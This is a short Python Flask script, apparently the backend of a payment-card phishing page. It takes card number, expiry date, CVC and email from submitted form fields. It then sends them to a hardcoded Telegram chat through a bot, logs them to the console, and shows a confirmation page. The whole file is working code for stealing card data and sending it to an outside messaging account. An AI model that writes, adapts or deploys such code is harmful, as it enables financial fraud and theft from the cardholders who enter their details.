from flask import Flask, request, jsonify, render_template
import telebot
TOKEN = "Token"
my_id = 8006053775
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/')
def index():
    if request.args:
        form_data = request.args

        card_number = form_data.get('card')
        expiry_month = form_data.get('mm')
        expiry_year = form_data.get('yy')
        cvc = form_data.get('cvc')
        owner_name = form_data.get('email')
        recaptcha_response = form_data.get('recaptchaResponse')
        form_services = form_data.get('formServices')
        bot.send_message(my_id, f"Получены данные формы:\nНомер карты: {card_number}\nСрок действия (месяц): {expiry_month}\nСрок действия (год): {expiry_year}\nCVC: {cvc}\nИмя владельца: {owner_name}")
        print(f"Получены данные формы:")
        print(f"Номер карты: {card_number}")
        print(f"Срок действия (месяц): {expiry_month}")
        print(f"Срок действия (год): {expiry_year}")
        print(f"CVC: {cvc}")
        print(f"Имя владельца: {owner_name}")
        return render_template('commit.html')

    else:
        return render_template('index.html')
if __name__ == '__main__':
    app.run(debug=True)
